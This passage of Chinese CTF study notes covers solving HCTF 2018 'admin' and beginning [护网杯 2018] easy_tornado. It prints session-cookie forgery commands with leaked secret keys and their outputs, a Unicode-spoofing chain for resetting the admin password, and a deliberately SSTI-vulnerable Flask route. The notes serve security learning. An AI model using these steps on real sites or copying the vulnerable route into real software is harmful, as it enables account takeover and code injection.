</blockquote>
<p><strong>一般session会被保存到服务端中（服务端cookie，但是flask的session是存储在客户端的cookie里的</strong></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/6277797-c018a4c5b5be1541.png" srcset="/img/loading.gif" alt="img"></p>
<blockquote>
<p>flask对session的处理位于flask/sessions.py中（本题没找到），默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p>
</blockquote>
<p>session一般格式：</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/t01ef54ad8392df284d.png" srcset="/img/loading.gif" alt="img"></p>
<pre><code class="hljs gcode">.eJwljrFuwzAMBf<span class="hljs-number">9</span>FcwZSpkQyP<span class="hljs-number">2</span><span class="hljs-symbol">NQoh5</span>aBGgB<span class="hljs-meta">O5</span>mC_Hs<span class="hljs-symbol">NdLy75</span>d<span class="hljs-number">5</span>lx<span class="hljs-number">7</span>HOr<span class="hljs-number">3</span>J_Hq<span class="hljs-number">91</span>K_t<span class="hljs-number">3</span>l<span class="hljs-symbol">nuxGamDI6</span>kmLPpa<span class="hljs-number">1</span>TE<span class="hljs-number">0</span>UKteyYSpJyaaVJ<span class="hljs-number">8</span>hRGZDk<span class="hljs-number">7</span>ZtLlEbpALjxjOc<span class="hljs-number">1</span>SaZWzLSx-aB<span class="hljs-number">3</span>p<span class="hljs-number">0</span>djSta<span class="hljs-number">984</span>kjXqMrQqrE<span class="hljs-number">3</span>WhBM<span class="hljs-meta">o18</span>jrX<span class="hljs-number">8</span>X_D<span class="hljs-number">9</span>eJ<span class="hljs-number">5</span>Htifv<span class="hljs-number">4</span>_<span class="hljs-number">1</span>cxltCgQ<span class="hljs-number">3</span>V<span class="hljs-number">0</span>zvIsGBjDAlGQsq<span class="hljs-symbol">NJEi08</span>v<span class="hljs-symbol">nD15</span>kP<span class="hljs-number">8</span>Q.XxKIMg.iW<span class="hljs-number">96</span>TDgIamKLQ<span class="hljs-number">0</span>x<span class="hljs-number">9</span>h<span class="hljs-number">5</span>LoPsUCIvw</code></pre>
<p>通过.隔开的<strong>3段内容</strong>，第一段其实就是base64
encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</p>
<pre><code class="hljs php">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code></pre>
<ul>
<li><p>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</p></li>
<li><p>漏洞成因
漏洞的根源是<strong>secretkey被获取</strong>，应当使用完全随机的secretkey，或在clone某项目后修改为随机的key。
<strong>需要特别注意的是python2与python3下产生的timestamp是不一样的！</strong></p></li>
<li><p>==生成 session cookie 需要 secret_key 解码 session cookie
可以不需要 secret_key==</p></li>
<li><p><strong>利用工具：</strong></p></li>
</ul>
<p>​ https://github.com/noraj/flask-session-cookie-manager</p>
<p>​
<strong>由上文所述的session格式可知，要修改并伪造一个session的必要条件就是知道加密所采用的</strong><code>secret_key</code><strong>，一旦获取到</strong><code>secret_key</code><strong>,
我们就可以轻松的构造签名，从而实现客户端的session的伪造。</strong></p>
<ul>
<li><strong>安装问题</strong>：<a target="_blank" rel="noopener" href="https://chenlvtang.top/2020/07/28/Flask%E3%81%AE%E5%88%9D%E8%AF%86/">参考博客</a>，安装完后出现helloworld后退出虚拟环境，直接运行脚本【注意，虚拟环境里设置的脚本是python.exe所以用法是python
flask_xxx而不是python3 flask_xxx】</li>
</ul>
<p>cmd直接执行某文件夹下的exe：</p>
<pre><code class="hljs taggerscript">&quot;D:<span class="hljs-symbol">\W</span>ork<span class="hljs-symbol">\v</span>scode<span class="hljs-symbol">\M</span>icrosoft VS Code<span class="hljs-symbol">\_</span><span class="hljs-symbol">\C</span>ode.exe&quot;    //路径有空格情况下要加书昂引号</code></pre>
<p>用法：</p>
<p>解密:
<code>python flask_session_manager.py decode -s SECRET_KEY -c session</code></p>
<p>加密:
<code>python flask_session_manager.py encode -s SECRET_KEY -t 未加密session</code></p>
<pre><code class="hljs python">加密：【必须要有secret_key】
$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py encode -s <span class="hljs-string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span>
==》eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw

解密：【可有可无key】
有key:
$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py decode -c <span class="hljs-string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span> -s <span class="hljs-string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span>
==》&#123;<span class="hljs-string">u&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">u&#x27;number&#x27;</span>: <span class="hljs-string">&#x27;326410031505&#x27;</span>&#125;

无kwy：
$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py decode -c <span class="hljs-string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span>
==》&#123;<span class="hljs-string">&quot;number&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;MzI2NDEwMDMxNTA1&quot;</span>&#125;,<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>&#125;&#125;</code></pre>
<p>注册用户abc，密码123，F12抓包得到session</p>
<pre><code class="hljs apache"><span class="hljs-attribute">session</span>=.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_<span class="hljs-number">751</span>F<span class="hljs-number">3</span>aP<span class="hljs-number">7837</span>HjPzYMtt<span class="hljs-number">154</span>cm<span class="hljs-number">5</span>y<span class="hljs-number">7</span>Sztiy_<span class="hljs-number">0</span>nmzzY<span class="hljs-number">25</span>pNGIiFt<span class="hljs-number">0</span>JG<span class="hljs-number">9</span>DBGtXAg<span class="hljs-number">6</span>rTUszH<span class="hljs-number">2</span>eV<span class="hljs-number">8</span>KGaB<span class="hljs-number">3</span>DgzcStME<span class="hljs-number">0</span>EXAWGUQc<span class="hljs-number">05</span>mIJT<span class="hljs-number">01</span>H<span class="hljs-number">8</span>EinVmReFQ<span class="hljs-number">15</span>y<span class="hljs-number">0</span>jcjzjEwRrK<span class="hljs-number">8</span>SVI<span class="hljs-number">23</span>Zn<span class="hljs-number">61</span>Hu<span class="hljs-number">7</span>WUIpi<span class="hljs-number">0</span>AoPKOSBTH<span class="hljs-number">5</span>DPcvA<span class="hljs-number">0</span>N<span class="hljs-number">3</span>qalyaeYZ<span class="hljs-number">6</span>l<span class="hljs-number">6</span>DecKvqd_IyoJhz<span class="hljs-number">0</span>HWKOkzZc<span class="hljs-number">8</span>Q<span class="hljs-number">2</span>p<span class="hljs-number">267</span>PH-F<span class="hljs-number">9</span>vh_Qmwc<span class="hljs-number">8</span>OoGfc<span class="hljs-number">3</span>RD<span class="hljs-number">1</span>EjA<span class="hljs-number">3</span>kb<span class="hljs-number">0</span>FMCrzUGPeDXUslIfeFRUQaz<span class="hljs-number">6</span>U_dPq<span class="hljs-number">527</span>V_T<span class="hljs-number">6</span>ugarH<span class="hljs-number">4</span>nx<span class="hljs-number">1</span>VsX<span class="hljs-number">9</span>Z<span class="hljs-number">6</span>w<span class="hljs-number">0</span>bscmq<span class="hljs-number">7</span>n<span class="hljs-number">6</span>-xNGHPbzbYaq<span class="hljs-number">0</span>.YiIR<span class="hljs-number">9</span>A.ANlJjD-W<span class="hljs-number">7</span>HclEQHya-wgAX<span class="hljs-number">8</span>O<span class="hljs-number">9</span>uo; HttpOnly; Path=/</code></pre>
<p>要生成session需要secret_key，搜索，在config.py中找到secret_key：ckj123</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304224727300.png" srcset="/img/loading.gif" alt="image-20220304224727300"></p>
<p>解密失败：[Decoding error] Invalid base64-encoded data</p>
<p><span style="background:#FF9999;"><strong>注意：解密的序列串前的点（.）不能少！而且最好用双引号、有secret_key下用key完全解密，否则解密出来还是base64的</strong></span></p>
<pre><code class="hljs bash">python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&quot;.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_751F3aP7837HjPzYMtt154cm5y7Sztiy_0nmzzY25pNGIiFt0JG9DBGtXAg6rTUszH2eV8KGaB3DgzcStME0EXAWGUQc05mIJT01H8EinVmReFQ15y0jcjzjEwRrK8SVI23Zn61Hu7WUIpi0AoPKOSBTH5DPcvA0N3qalyaeYZ6l6DecKvqd_IyoJhz0HWKOkzZc8Q2p267PH-F9vh_Qmwc8OoGfc3RD1EjA3kb0FMCrzUGPeDXUslIfeFRUQaz6U_dPq527V_T6ugarH4nx1VsX9Z6w0bscmq7n6-xNGHPbzbYaq0.YiIR9A.ANlJjD-W7HclEQHya-wgAX8O9uo&quot;</span> -s ckj123

&#123;<span class="hljs-string">&#x27;_fresh&#x27;</span>: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;04cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;2ea3d13566555adb6d6641bdead5908afc2c4f80&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;jxU5&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;</code></pre>
<p>看到用户abc</p>
<p>或者可以直接用p牛的解密脚本，无需key</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305135431149.png" srcset="/img/loading.gif" alt="image-20220305135431149"></p>
<p>试试改为admin，+key生成session：</p>
<pre><code class="hljs cmd">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;<span class="hljs-number">04</span>cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">2</span>ea3d13566555adb6d6641bdead5908afc2c4f80&#x27;, &#x27;image&#x27;: b&#x27;jxU5&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;<span class="hljs-number">10</span>&#x27;&#125;&quot; -s ckj123

.eJxFkE-LwjAQxb_KkrOHNtteBA8uMaGFmVJJG5KL-KeaJqYLVVErfvetLuwe35v3e8zMg6z2fXOyZHruL82ErNodmT7Ix4ZMCbClM4wHdJCiWFpgVVzIeYpDNhSMexisBQW3QtUeZO4xlAmEjGo1EoI7PXx5HarEsNyirKiWJiDNEq1yb1wZoaidUYurcXA3SsfIRi3wiIwftcpuKOcJKH03skwLtUhQHiKUW2pE9akd98gWFGQVo_Qz8pyQ7anfr87fvun-Twi1BVreYKgoujGquNfOeHQ6gtcaox7xayF40EPuUOgE5rN3XRvWh-avad3ZGsvfSbcOzcvahbYjE3I5Nf37bySOyPMHEwhrkA.YiIoxQ.<span class="hljs-number">1</span>STJCvyLZME_COi7806tpsQssx4</code></pre>
<p>提交伪造session得到flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304225810232.png" srcset="/img/loading.gif" alt="image-20220304225810232" style="zoom: 67%;"></p>
<h4 id="unicode欺骗">unicode欺骗</h4>
<blockquote>
<p>参考：</p>
<p>https://darkwing.moe/2019/11/04/HCTF-2018-admin/</p>
<p>更多，包含其他字符欺骗（<strong>idna</strong>
）+php变量绕过：https://www.geek-share.com/detail/2798492491.html</p>
</blockquote>
<p>查看源码，发现各种操作：注册，登录，修改密码，都会先对用户名小写</p>
<pre><code class="hljs fortran"><span class="hljs-keyword">name</span> = strlower(<span class="hljs-keyword">form</span><span class="hljs-number">.</span>username<span class="hljs-number">.</span><span class="hljs-keyword">data</span>)</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305140113647.png" srcset="/img/loading.gif" alt="image-20220305140113647" style="zoom:67%;"></p>
<p>函数定义：</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span>
    username = nodeprep.prepare(username)
    <span class="hljs-keyword">return</span> username</code></pre>
<p>而nodeprep是个库，from twisted.words.protocols.jabber.xmpp_stringprep
import
nodeprep，而源码导入的版本是10.2.0，而官网最新的版本是22.2.0，这么老的版本肯定会有漏洞</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141538923.png" srcset="/img/loading.gif" alt="image-20220305141538923" style="zoom:67%;"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305141458847.png" srcset="/img/loading.gif" alt="image-20220305141458847"></p>
<ul>
<li>漏洞成因：</li>
</ul>
<p>unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作</p>
<pre><code class="hljs clean">ᴬ -&gt; A -&gt; a
即该函数调用第一次将其转换为大写，第二次将其转换为小写</code></pre>
<p><strong>所以当我们用<code>ᴬdmin</code>注册的话，后台代码调用一次nodeprep.prepare函数，添加用户Admin+密码</strong></p>
<p><strong>我们用<code>ᴬdmin</code>进行登录，后台代码调用一次nodeprep.prepare函数，后台以为登陆的用户是Admin，检查有无这个用户+密码正确与否，然后登录成功后<code>session['name']=Admin</code>，可以看到index页面的username变成了Admin</strong></p>
<p><strong>登陆状态下修改密码，后台代码<code>name = strlower(session['name'])</code>,对session['name']调用一次nodeprep.prepare函数，name变为<code>admin</code>,然后修改用户为admin的密码</strong></p>
<p>那么，攻击链大概就这样</p>
<ul>
<li>注册用户ᴬdmin</li>
<li>登录用户ᴬdmin，变成Admin</li>
<li>修改密码Admin，更改了admin的密码</li>
</ul>
<p>在index.html中可以看到只要<code>session['name']=='admin'</code>,也就是只要用户名是<code>admin</code>就可成功登录了</p>
<ul>
<li><p>具体字母怎么找?</p>
<p>关于具体编码可查
https://unicode-table.com/en/sets/superscript-and-subscript-letters/，当然你也可以复制过后用站长工具转换成Unicode编码。</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305145448969.png" srcset="/img/loading.gif" alt="image-20220305145448969" style="zoom:67%;"></p></li>
</ul>
<h2 id="护网杯-2018easy_tornado">[护网杯 2018]easy_tornado（**）</h2>
<h4 id="考点cookie_secret模板注入">考点：cookie_secret、模板注入</h4>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227192953750.png" srcset="/img/loading.gif" alt="image-20220227192953750"></p>
<p>点进界面，打开flag.txt，得到提示flag in /fllllllllllllag</p>
<p>打开welcome.txt，得到提示render</p>
<p>打开hints.txt，得到提示md5(cookie_secret+md5(filename))</p>
<p>然后每次打开文件，url里都有提交参数，filename和filehash</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227193123613.png" srcset="/img/loading.gif" alt="image-20220227193123613"></p>
<p>猜测filehash对应的上filename才能访问，但是cookie_secret是啥呢？</p>
<p>抓包，查看cookie，发现并无cookie</p>
<p>burp抓包flag.txt那个文件，发现304 NOT
modified，但是直接访问是可以访问的</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227194449791.png" srcset="/img/loading.gif" alt="image-20220227194449791"></p>
<h4 id="not-modified">304 NOT modified</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304">304
Not Modified</a> ：304 未改变</p>
<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/304%E7%8A%B6%E6%80%81%E7%A0%81/7867141">百度百科</a></p>
</blockquote>
<p>304（未修改）
:自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。</p>
<p>​ 1.
如果网页自请求者上次请求后再也没有更改过，您应将服务器配置为返回此响应（称为
If-Modified-Since HTTP 标头）。服务器可以告诉 Googlebot
自从上次抓取后网页没有变更，进而节省带宽和开销。</p>
<p>​ 2. HTTP 304
未改变说明无需再次传输请求的内容，也就是说可以使用缓存的内容。这通常是在一些安全的方法（safe），例如<strong>GET
或HEAD 或在请求中附带了头部信息：
If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since
中任一首部。</strong></p>
<p>​ 3. 如果是 200 OK ，响应会带有头部 Cache-Control, Content-Location,
Date, ETag, Expires，和 Vary.</p>
<h4 id="啥是-cache-control"><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79042406">啥是 Cache-Control
？</a></h4>
<p>​ Cache-Control 是一个 HTTP
协议中关于缓存的响应头，它由一些能够允许你定义一个响应资源应该何时、如何被缓存以及缓存多长时间的指令组成。</p>
<h5 id="cache-control-max-age">Cache-Control max-age</h5>
<p>这个指令告诉浏览器端或者中间者，响应资源能够在它被请求之后的多长时间以内被复用。例如，<code>max-age</code>等于
3600 意味着响应资源能够在接下来的 60
分钟以内被复用，<strong>而不需要从服务端重新获取</strong>。（可以发现，<code>max-age</code>的单位是秒）</p>
<h4 id="什么是etag"><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903870636769293">什么是ETag？</a></h4>
<p>Etag是 Entity
tag的缩写，可以理解为“被请求变量的实体值”，Etag是服务端的一个资源的标识，在
HTTP
响应头中将其传送到客户端。所谓的服务端资源可以是一个Web页面，也可以是JSON或XML等。服务器单独负责判断记号是什么及其含义，并在HTTP响应头中将其传送到客户端。<strong>另一种说法是，ETag是一个可以与Web资源关联的记号（token）</strong></p>
<p>比如，<strong>浏览器第一次请求一个资源的时候，服务端给予返回，并且返回了ETag</strong>:
"50b1c1d4f775c61:df3"
这样的字样给浏览器，当浏览器再次请求这个资源的时候，浏览器会将If-None-Match:
W/"50b1c1d4f775c61:df3"
【<strong>相同ETag值</strong>】传输给服务端，服务端拿到该ETAG，对比资源是否发生变化，如果资源未发生改变，则返回304HTTP状态码，不返回具体的资源。</p>
<p>解题：</p>
<pre><code class="hljs isbl"><span class="hljs-number">1</span>.flag在/<span class="hljs-variable">fllllllllllllag</span>
<span class="hljs-number">2</span>.filehash：<span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>))</span></code></pre>
<p>所以我们的差的就是cookie_secret了，下面开始拿cookie_secret</p>
<p>通过源码和请求头并没有看到任何的cookie_secret信息，当我们尝试访问/fllllllllllllag，报错</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png" srcset="/img/loading.gif" alt="image-20220227211937496"></p>
<p>思路断了，看WP才知道与304cache无关。。<strong>题目是easy_tornado，/welcome.txt页面也看到==render==，可能会是SSTI模板注入</strong></p>
<h4 id="模板注入">模板注入**</h4>
<blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679"><strong>详细，易懂，适合小白+CTF各种过滤绕过姿势</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/csvoss/onelinerizer">推荐一个能把Python代码给编译成一句话的形式工具</a></p>
</blockquote>
<p>总结起来就是类似SQL注入，通过控制输入参数得到数据</p>
<h5 id="渲染">渲染</h5>
<ul>
<li>前端开发过程：</li>
</ul>
<p>浏览器这边做的工作大致分为以下几步：</p>
<p>加载：根据请求的URL进行域名解析，向服务器发起请求，接收文件（HTML、JS、CSS、图象等）。</p>
<p>解析：对加载到的资源（HTML、JS、CSS等）进行语法解析，建议相应的内部数据结构（比如HTML的DOM树，JS的（对象）属性表，CSS的样式规则等等）</p>
<p><strong>渲染</strong>：构建渲染树，对各个元素进行位置计算、样式计算等等，然后根据渲染树对页面进行渲染（可以理解为“画”元素）【<strong>绘制</strong>】【<strong>将HTML变成人眼看到的图像</strong>】</p>
<p>这几个过程不是完全孤立的，会有交叉，比如HTML加载后就会进行解析，然后拉取HTML中指定的CSS、JS等。</p>
<blockquote>
<p>举例子：</p>
<p>你要吃个菜，你找到厨师说，我要尖椒肉丝。</p>
<p>厨师就去翻菜谱，炒给你吃。</p>
<p>你是浏览者</p>
<p>菜是你将看到的页面</p>
<p>厨师是浏览器</p>
<p>菜谱是程序员写的页面代码</p>
<p>炒菜的过程，就是页面渲染</p>
</blockquote>
<h5 id="dom"><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/34219998">DOM</a></h5>
<p>DOM是Document Object Model的英文缩写，翻译过来是文档对象模型</p>
<p>当浏览器读到这些代码时，它会建立一个<a target="_blank" rel="noopener" href="https://javascript.info/dom-nodes">“DOM
节点”树</a>来保持追踪所有内容，如同你会画一张家谱树来追踪家庭成员的发展一样，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。【就是把HTML代码转化为树】</p>
<p><strong>文档对象模型就是基于这样的文档视图结构的一种模型，所有的html页面都逃不开这个模型，也可以把它称为==节点树==更为准确。</strong></p>
<h5 id="什么是模板">什么是模板</h5>
<ul>
<li><p>这里特指用于 web
开发的模板引擎，是为了用户界面与业务数据（内容）分离而产生的。
可以生成特定格式的文档，利用模板引擎来生成前端的html代码，反馈给浏览器，呈现在用户面前。
大概就是一个网页的框架，</p></li>
<li><p>模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p></li>
<li><p>而造成服务器端模板注入漏洞的成因就是服务端接收了用户的恶意输入后，未经任何处理就将其作为
web
应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，从而导致了敏感信息的泄露、代码执行、getshell
等问题。</p></li>
</ul>
<h5 id="什么是框架">什么是框架</h5>
<blockquote>
<p>https://www.kancloud.cn/kancloud/python-basic/41708</p>
</blockquote>
<ol type="1">
<li><p>不管是python，还是php，亦或别的做web项目的语言，乃至于做其它非web项目的<strong>开发</strong>，一般都要用到一个称之为什么什么框架的东西。</p></li>
<li><p>简而言之，框架就是制定一套规范或者规则（思想），大家（程序员）在该规范或者规则（思想）下工作。或者说就是<strong>使用别人搭好的舞台，你来做表演</strong>。</p></li>
<li><p><span style="background:#BBFFBB;">python常见web框架</span>：</p></li>
</ol>
<ul>
<li>Django:这是一个被广泛应用的框架，如果看官在网上搜索，会发现很多公司在招聘的时候就说要会这个，其实这种招聘就暴露了该公司的开发水平要求不高。框架只是辅助，真正的程序员，用什么框架，都应该是根据需要而来。当然不同框架有不同的特点，需要学习一段时间。</li>
<li>==Flask==：一个用Python编写的轻量级Web应用框架。基于Werkzeug
WSGI工具箱和Jinja2模板引擎。</li>
<li>Web2py：是一个为Python语言提供的全功能Web应用框架，旨在敏捷快速的开发Web应用，具有快速、安全以及可移植的数据库驱动的应用，兼容Google
App Engine（这是google的元计算引擎，后面我会单独介绍）。</li>
<li>Bottle: 微型Python
Web框架，遵循WSGI，说微型，是因为它只有一个文件，除Python标准库外，它不依赖于任何第三方模块。</li>
<li>Tornado：全称是Torado Web
Server，从名字上看就可知道它可以用作Web服务器，但同时它也是一个Python
Web的开发框架。最初是在FriendFeed公司的网站上使用，FaceBook收购了之后便开源了出来。</li>
<li>webpy: 轻量级的Python Web框架。webpy的设计理念力求精简（Keep it
simple and
powerful），源码很简短，只提供一个框架所必须的东西，不依赖大量的第三方模块，它没有URL路由、没有模板也没有数据库的访问。</li>
</ul>
<h5 id="一些tornado语法">一些tornado语法：</h5>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/kancloud/python-basic/41713">参考手册**</a></p>
</blockquote>
<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页
render配合Tornado使用</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment">#coding:utf-8</span>

<span class="hljs-keyword">import</span> tornado.httpserver
<span class="hljs-keyword">import</span> tornado.ioloop
<span class="hljs-keyword">import</span> tornado.options
<span class="hljs-keyword">import</span> tornado.web

<span class="hljs-keyword">from</span> tornado.options <span class="hljs-keyword">import</span> define, options
define(<span class="hljs-string">&quot;port&quot;</span>, default=<span class="hljs-number">8000</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;run on the given port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)  //指定网页访问的端口

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span>  //制定类及方法
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>
        greeting = self.get_argument(<span class="hljs-string">&#x27;greeting&#x27;</span>, <span class="hljs-string">&#x27;Hello&#x27;</span>)   //获得GET参数值，前者是参数名，后面是默认值，必须
        self.write(greeting + <span class="hljs-string">&#x27;, welcome you to read: www.itdiffer.com&#x27;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    tornado.options.parse_command_line()   //启动命令行
    app = tornado.web.Application(handlers=[(<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler)]) //实例化，handlers类似路由，列表里每个元素有两个参数，路径和处理它的类
    http_server = tornado.httpserver.HTTPServer(app)  //调用对象执行http服务器
    http_server.listen(options.port)  //提供发送响应的接口
    tornado.ioloop.IOLoop.instance().start()  //表示可以接收来自HTTP的请求了</code></pre>
<p><strong>用python运行这个文件，其实就已经发布了一个网站</strong></p>
<ul>
<li>而模板文件里，将<code>&#123;&#123;placeholder&#125;&#125;</code>理解为占位符，就是变量，看HTML模板代码中，有类似<code>&#123;&#123;username&#125;&#125;</code>的变量，模板中用`{{}}`引入变量，这个变量就是在self.render()中规定的，两者变量名称一致，对应将相应的值对象引入到模板中
- 用``的方式，将一个字符串赋给了变量var，然后就可以直接引用这个变量了：python-tornado。这样就是实现了模板中变量的使用</li>
</ul>
<h5 id="ssti">SSTI</h5>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/author/和蔼的杨小二">freebuf
从零学习flask模板注入**</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96480967">csdn
SSTI完全学习+工具Tplmap实例</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Goodric/article/details/115170932?utm_source=app&amp;app_version=4.20.0">csdn初识
SSTI 服务器端模板注入，有py2+py3的payload</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">🛠模板注入，工具Tplmap**</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2908">源码+ctf例题：Python中从服务端模板注入到沙盒逃逸的源码探索
(一)</a></p>
</blockquote>
<p>SSTI就是服务器端模板注入(Server-Side Template Injection)</p>
<ul>
<li>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如<span style="background:#FF9999;">Python的jinja2(Flask) mako tornado
django，php的smarty twig，java的jade
velocity</span>。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</li>
</ul>
<h6 id="xss利用">XSS利用</h6>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/test/&#x27;)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)
    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)   //python里的三引号指多行代码，%s指字符串，由变量code填充
    <span class="hljs-keyword">return</span> render_template_string(html)</code></pre>
